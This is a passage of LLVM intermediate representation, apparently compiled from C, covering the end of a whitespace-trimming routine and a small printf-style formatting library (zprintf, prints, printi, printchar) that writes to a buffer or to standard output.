  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !4
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !7, !noalias !4
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !7, !noalias !4
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !4
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !4
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !7, !noalias !4
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !4
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !4
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !7, !noalias !4
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !4
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !4
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !7, !noalias !4
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #15
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !12

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
